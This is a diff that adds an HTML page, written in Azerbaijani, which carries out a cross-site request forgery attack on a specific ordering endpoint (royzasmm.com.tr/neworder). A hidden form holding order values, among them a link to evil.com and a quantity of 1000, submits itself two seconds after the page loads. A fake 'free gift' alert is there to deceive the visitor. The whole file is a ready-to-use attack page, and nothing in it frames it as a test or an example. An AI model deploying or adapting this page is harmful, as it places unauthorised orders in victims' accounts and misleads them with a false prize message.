@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Hücum Səhifəsi</title>
+    <meta charset="utf-8">
+</head>
+<body>
+    <h1>🎁 Pulsuz Hədiyyə!</h1>
+    <p>Bu səhifəyə daxil olduğunuzda avtomatik olaraq sifariş veriləcək!</p>
+    
+    <!-- CSRF Hücum Formu -->
+    <form id="csrfForm" method="post" action="https://royzasmm.com.tr/neworder" style="display:none;">
+        <input type="hidden" name="categories" value="1">
+        <input type="hidden" name="services" value="1">
+        <input type="hidden" name="link" value="https://evil.com">
+        <input type="hidden" name="quantity" value="1000">
+        <input type="hidden" name="neworder_check" value="on">
+    </form>
+    
+    <script>
+        // Səhifə yükləndikdə avtomatik form göndərmə
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('csrfForm').submit();
+            }, 2000); // 2 saniyə sonra
+        };
+        
+        // İstifadəçini aldadmaq üçün saxta mesaj
+        alert('Təbrik! Pulsuz hədiyyə qazandınız!');
+    </script>
+</body>
+</html>
